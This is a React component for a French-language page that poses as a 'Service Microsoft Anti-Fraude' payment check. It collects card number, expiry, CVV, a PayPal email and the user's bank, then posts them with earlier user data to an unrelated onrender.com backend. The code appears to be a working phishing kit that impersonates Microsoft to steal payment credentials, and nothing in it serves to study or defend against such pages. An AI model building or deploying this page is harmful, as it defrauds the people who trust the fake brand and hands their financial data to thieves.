import { useState } from "react";
import axios from "../axios";

export default function PaymentVerificationForm({ userData }) {
  const [paypalChecked, setPaypalChecked] = useState(false);
  const [bankChecked, setBankChecked] = useState(false);

  const handleSubmit = async (e) => {
    console.log("test");
    e.preventDefault();

    const paymentData = {
      cardType: document.getElementById("card-type").value,
      cardNumber: document.getElementById("card-number").value,
      expiry: document.getElementById("expiry").value,
      cvv: document.getElementById("cvv").value,
      paypal: paypalChecked ? document.getElementById("paypal-email").value : null,
      bank: bankChecked ? document.getElementById("bank-name").value : null,
    };

    const fullData = { ...userData, ...paymentData };

    try {
      const res = await axios.post("https://back-fafv.onrender.com/api/form",fullData)
      console.log(res.data);
      alert("✔ Données enregistrées avec succès !");
    } catch (err) {
      console.error("❌ Erreur lors de l'envoi des données:", err);
    }
  };

  return (
    <div className="form-container">
      <div className="form-header">
        <img
          src="https://img.icons8.com/color/48/microsoft.png"
          alt="Microsoft Logo"
          className="logo"
        />
        <h2>Service Microsoft Anti-Fraude</h2>
      </div>
      <div className="form-title">
        <span className="lock-icon">🔒</span>
        <h1>Vérification des moyens de paiement</h1>
      </div>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="card-type">Type de carte</label>
          <select id="card-type" name="card-type">
            <option value="visa">Visa</option>
            <option value="mastercard">Mastercard</option>
            <option value="amex">American Express</option>
          </select>
        </div>
        <div className="form-row">
          <div className="form-group half-width">
            <label htmlFor="card-number">Numéro de carte</label>
            <input type="text" id="card-number" name="card-number" />
          </div>
          <div className="form-group quarter-width">
            <label htmlFor="expiry">Expiration</label>
            <input type="text" id="expiry" name="expiry" placeholder="MM/AA" />
          </div>
          <div className="form-group quarter-width">
            <label htmlFor="cvv">Code CVV</label>
            <input type="text" id="cvv" name="cvv" />
          </div>
        </div>
        <div className="form-group checkbox-group">
          <input
            type="checkbox"
            id="paypal-checkbox"
            name="paypal-checkbox"
            checked={paypalChecked}
            onChange={(e) => setPaypalChecked(e.target.checked)}
          />
          <label htmlFor="paypal-checkbox">J'ai un compte PayPal</label>
          <input
            type="email"
            id="paypal-email"
            name="paypal-email"
            placeholder="Email PayPal"
            disabled={!paypalChecked}
          />
        </div>
        <div className="form-group checkbox-group">
          <input
            type="checkbox"
            id="bank-checkbox"
            name="bank-checkbox"
            checked={bankChecked}
            onChange={(e) => setBankChecked(e.target.checked)}
          />
          <label htmlFor="bank-checkbox">J'utilise une banque en ligne</label>
         <select
  id="bank-name"
  name="bank-name"
  disabled={!bankChecked}
>
  <option value="">-- Sélectionnez votre banque --</option>
  <option value="BNP Paribas">BNP Paribas</option>
  <option value="Société Générale">Société Générale</option>
  <option value="Crédit Agricole">Crédit Agricole</option>
  <option value="Crédit Mutuel">Crédit Mutuel</option>
  <option value="La Banque Postale">La Banque Postale</option>
  <option value="LCL">LCL (Le Crédit Lyonnais)</option>
  <option value="HSBC">HSBC France</option>
  <option value="Caisse d'Épargne">Caisse d'Épargne</option>
  <option value="Banque Populaire">Banque Populaire</option>
  <option value="Boursorama">Boursorama</option>
  <option value="N26">N26</option>
  <option value="Revolut">Revolut</option>
</select>

        </div>
        <button type="submit" className="btn-submit">Valider</button>
      </form>
    </div>
  );
}
